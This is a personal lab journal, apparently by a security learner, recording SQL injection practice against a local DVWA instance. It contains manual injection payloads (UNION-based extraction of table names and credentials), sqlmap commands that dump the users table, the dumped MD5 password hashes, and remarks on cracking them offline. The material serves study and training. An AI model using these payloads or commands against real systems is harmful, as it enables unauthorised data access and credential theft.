## Day 001 – 2026-04-04

**Focus:** SQL Injection fundamentals — DVWA (Damn Vulnerable Web Application)
**Environment:** Kali Linux 2024.1, DVWA running locally on Apache (http://127.0.0.1/dvwa)

---

### Commands Run

```bash
# Start Apache and MySQL for DVWA
sudo service apache2 start
sudo service mysql start

# Access DVWA in browser
# Set security level to "Low" in DVWA settings

# Test SQLi in browser URL bar / input field
# Payload 1: break the query
'

# Payload 2: always-true condition
' OR '1'='1

# Payload 3: comment out the rest of the query
' OR 1=1 --
' OR 1=1 #

# Payload 4: enumerate columns with ORDER BY
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --    <-- error here means 2 columns

# Payload 5: UNION-based injection to extract data
' UNION SELECT null, null --
' UNION SELECT 1, database() --
' UNION SELECT 1, user() --
' UNION SELECT 1, version() --

# Payload 6: enumerate tables
' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --

# Payload 7: extract columns from a table
' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --

# Payload 8: dump credentials
' UNION SELECT user, password FROM users --

# Automate with sqlmap
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  --dbs

sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  -D dvwa --tables

sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low" \
  -D dvwa -T users --dump
```

---

### What Happened

**Manual injection:**
```
Input: ' OR 1=1 --
Response: ALL user records displayed (instead of just one)
```

**UNION injection to get database version:**
```
Input: ' UNION SELECT 1, version() --
Response: 5.5.62-0ubuntu0.14.04.1
```

**SQLMap dump:**
```
Database: dvwa
Table: users
[5 entries]
+----+---------+----------------------------------+----------+
| id | user    | password                         | avatar   |
+----+---------+----------------------------------+----------+
| 1  | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | ...      |
| 2  | gordonb | e99a18c428cb38d5f260853678922e03 | ...      |
| 3  | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | ...      |
```

The `password` column contains MD5 hashes. `5f4dcc3b5aa765d61d8327deb882cf99` = `password` (MD5). Cracked offline in seconds.

---

### Mistakes Made

1. **First payload `'` caused a PHP error exposed in the response** — useful for detecting SQLi, but in a real test, error-based injection is only one type. The target may not always show errors.
2. **Tried `--dump-all` with sqlmap** — it dumped the entire database server including `information_schema`. Way too much data. Use `-D dbname -T tablename --dump` to be targeted.
3. **UNION SELECT column count was wrong at first** — got a syntax error until I used `ORDER BY` to enumerate the correct number of columns (2 in this case).

---

### What I Learned

- **SQL Injection** happens when user input is inserted directly into a SQL query without sanitization.
- The `'` character breaks out of a string context in SQL — if the app errors or behaves differently, it may be injectable.
- **UNION-based injection** requires matching the exact number of columns of the original query — use `ORDER BY` to find the count.
- **`information_schema`** is a meta-database in MySQL that stores info about all databases, tables, and columns — a goldmine for SQLi enumeration.
- **SQLMap** automates detection and exploitation beautifully, but always understand the manual technique first.
- MD5 hashes are trivially crackable — `hashcat`, `john`, or even CrackStation.net will get most common passwords instantly.
